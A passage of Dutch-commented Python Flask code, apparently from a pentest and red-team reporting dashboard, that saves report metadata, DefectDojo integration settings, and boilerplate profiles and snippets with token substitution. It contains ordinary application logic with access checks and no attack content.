        p.rapport_roe = data['rapport_roe'].strip()[:10000]
    if 'rapport_test_start_date' in data:
        val = data['rapport_test_start_date']
        if val:
            try:
                import datetime as _dt
                p.rapport_test_start_date = _dt.date.fromisoformat(str(val))
            except (ValueError, TypeError):
                pass
        else:
            p.rapport_test_start_date = None
    if 'rapport_test_end_date' in data:
        val = data['rapport_test_end_date']
        if val:
            try:
                import datetime as _dt
                p.rapport_test_end_date = _dt.date.fromisoformat(str(val))
            except (ValueError, TypeError):
                pass
        else:
            p.rapport_test_end_date = None
    if 'rapport_versie' in data and isinstance(data['rapport_versie'], str):
        p.rapport_versie = data['rapport_versie'].strip()[:20]
    if 'rapport_versie_status' in data and isinstance(data['rapport_versie_status'], str):
        if data['rapport_versie_status'] in ('concept', 'review', 'herzien', 'definitief'):
            p.rapport_versie_status = data['rapport_versie_status']
    # Debrief-teksten
    for key in ('debrief_context', 'debrief_werkte', 'debrief_faalde',
                'debrief_detectie', 'debrief_vervolg'):
        if key in data and isinstance(data[key], str):
            setattr(p, key, data[key].strip()[:10000])
    # PDF-beveiliging: leeg -> uit; None/weglaten -> ongewijzigd
    if 'rapport_pdf_password' in data and isinstance(data['rapport_pdf_password'], str):
        p.rapport_pdf_password = data['rapport_pdf_password'][:200]
    if 'rapport_pdf_owner_password' in data and isinstance(data['rapport_pdf_owner_password'], str):
        p.rapport_pdf_owner_password = data['rapport_pdf_owner_password'][:200]
    # DefectDojo-configuratie. De verbinding (URL/sleutel/TLS) is server-breed en
    # wordt naar db_instellingen (s) geschreven zodat ze eenmalig volstaat voor
    # elke rapportage; product/engagement/auto-push blijven per project (p).
    if 'dd_url' in data and isinstance(data['dd_url'], str):
        s.dd_url = data['dd_url'].strip().rstrip('/')[:300]
        p.dd_url = ''  # legacy per-opdracht-waarde opruimen; globaal is leidend
    if 'dd_api_key' in data and isinstance(data['dd_api_key'], str):
        # Lege string wist de sleutel; anders overschrijven
        s.dd_api_key = data['dd_api_key'].strip()[:300]
        p.dd_api_key = ''
    for key in ('dd_product_id', 'dd_engagement_id'):
        if key in data:
            val = data[key]
            if val in (None, ''):
                setattr(p, key, None)
            else:
                try:
                    setattr(p, key, int(val))
                except (ValueError, TypeError):
                    pass
    if 'dd_verify_ssl' in data:
        s.dd_verify_ssl = bool(data['dd_verify_ssl'])
    if 'dd_auto_push' in data:
        p.dd_auto_push = bool(data['dd_auto_push'])
    db.session.commit()
    return jsonify({'ok': True})


def _profiel_json(prof):
    return {'id': prof.id, 'naam': prof.naam or '', 'testtype': prof.testtype or '',
            'is_default': bool(prof.is_default), 'volgorde': prof.volgorde or 0,
            'data': _boiler_data(prof)}


def _snippet_json(sn):
    return {'id': sn.id, 'titel': sn.titel or '', 'categorie': sn.categorie or '',
            'taal': sn.taal or '', 'tekst': sn.tekst or '', 'volgorde': sn.volgorde or 0}


@index_bp.route('/api/report-boiler', methods=['GET'])
def api_report_boiler():
    """Boilerplate-profielen, snippets, veld-labels en beschikbare tokens voor
    het tabblad Instellingen."""
    require_dashboard_access()
    _ensure_boiler_seed()
    profs = db_rapport_boiler.query.order_by(
        db_rapport_boiler.volgorde, db_rapport_boiler.id).all()
    snips = db_rapport_snippet.query.order_by(
        db_rapport_snippet.volgorde, db_rapport_snippet.id).all()
    return jsonify({
        'profielen': [_profiel_json(p) for p in profs],
        'snippets': [_snippet_json(s) for s in snips],
        'velden': [{'key': k, 'label': _RAPPORT_FIELD_LABELS.get(k, k)}
                   for k in _RAPPORT_DEFAULT_FIELDS],
        'tokens': [{'token': t, 'label': lbl} for t, lbl in _RAPPORT_TOKENS],
    })


@index_bp.route('/api/report-boiler', methods=['POST'])
def api_report_boiler_save():
    """Een boilerplate-profiel aanmaken of bijwerken."""
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    pid = data.get('id')
    prof = db.session.get(db_rapport_boiler, pid) if pid else None
    if prof is None:
        prof = db_rapport_boiler()
        db.session.add(prof)
    prof.naam = (str(data.get('naam') or 'Profiel')).strip()[:120] or 'Profiel'
    tt = str(data.get('testtype') or '')
    prof.testtype = tt if tt in ('', 'pentest', 'redteam') else ''
    prof.is_default = bool(data.get('is_default'))
    try:
        prof.volgorde = int(data.get('volgorde') or 0)
    except (TypeError, ValueError):
        prof.volgorde = 0
    velden = data.get('data') or {}
    clean = {}
    if isinstance(velden, dict):
        for k in _RAPPORT_DEFAULT_FIELDS:
            v = velden.get(k) or {}
            if isinstance(v, dict):
                clean[k] = {'nl': str(v.get('nl') or '')[:10000],
                            'en': str(v.get('en') or '')[:10000]}
    prof.data = json.dumps(clean)
    # Slechts één default toegestaan.
    if prof.is_default:
        db.session.flush()
        for other in db_rapport_boiler.query.filter(db_rapport_boiler.id != prof.id):
            other.is_default = False
    db.session.commit()
    return jsonify({'ok': True, 'id': prof.id})


@index_bp.route('/api/report-boiler/<int:pid>', methods=['DELETE'])
def api_report_boiler_delete(pid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    prof = db.session.get(db_rapport_boiler, pid)
    if prof is None:
        return jsonify({'ok': False, 'error': 'niet gevonden'}), 404
    if db_rapport_boiler.query.count() <= 1:
        return jsonify({'ok': False, 'error': 'minimaal één profiel vereist'}), 400
    db.session.delete(prof)
    db.session.commit()
    return jsonify({'ok': True})


@index_bp.route('/api/report-boiler/resolve', methods=['GET'])
def api_report_boiler_resolve():
    """Geef de standaardteksten van een profiel, met {{tokens}} ingevuld op basis
    van de actieve opdracht. Kiest automatisch het profiel dat bij het testtype
    past als er geen profiel_id is opgegeven."""
    require_dashboard_access()
    from meuk.flask import project as _project
    _ensure_boiler_seed()
    cfg = _project.current_config()
    taal = request.args.get('taal') or 'nl'
    if taal not in ('nl', 'en'):
        taal = 'nl'
    pid = request.args.get('profiel_id', type=int)
    prof = db.session.get(db_rapport_boiler, pid) if pid else None
    if prof is None:
        prof = _kies_boiler_profiel(cfg)
    out = {}
    if prof is not None:
        data = _boiler_data(prof)
        for k in _RAPPORT_DEFAULT_FIELDS:
            raw = (data.get(k) or {}).get(taal) or ''
            out[k] = _resolve_tokens(raw, cfg)
    return jsonify({'ok': True, 'profiel_id': prof.id if prof else None,
                    'profiel_naam': prof.naam if prof else '', 'velden': out,
                    'tokenvalues': _rapport_token_values(cfg)})


def _kies_boiler_profiel(cfg):
    """Beste profiel voor het testtype van de opdracht: eerst een exacte
    testtype-match, anders het default-profiel, anders het eerste."""
    tt = (getattr(cfg, 'rapport_testtype', '') or '') if cfg is not None else ''
    profs = db_rapport_boiler.query.order_by(
        db_rapport_boiler.volgorde, db_rapport_boiler.id).all()
    if not profs:
        return None
    for p in profs:
        if p.testtype and p.testtype == tt:
            return p
    for p in profs:
        if p.is_default:
            return p
    return profs[0]


@index_bp.route('/api/report-snippets', methods=['POST'])
def api_report_snippet_save():
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True) or {}
    sid = data.get('id')
    sn = db.session.get(db_rapport_snippet, sid) if sid else None
    if sn is None:
        sn = db_rapport_snippet()
        db.session.add(sn)
    sn.titel = (str(data.get('titel') or '')).strip()[:160]
    sn.categorie = (str(data.get('categorie') or '')).strip()[:80]
    taal = str(data.get('taal') or '')
    sn.taal = taal if taal in ('', 'nl', 'en') else ''
    sn.tekst = str(data.get('tekst') or '')[:10000]
    try:
        sn.volgorde = int(data.get('volgorde') or 0)
    except (TypeError, ValueError):
        sn.volgorde = 0
    db.session.commit()
    return jsonify({'ok': True, 'id': sn.id})


@index_bp.route('/api/report-snippets/<int:sid>', methods=['DELETE'])
def api_report_snippet_delete(sid):
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    sn = db.session.get(db_rapport_snippet, sid)
    if sn is None:
        return jsonify({'ok': False, 'error': 'niet gevonden'}), 404
    db.session.delete(sn)
    db.session.commit()
    return jsonify({'ok': True})
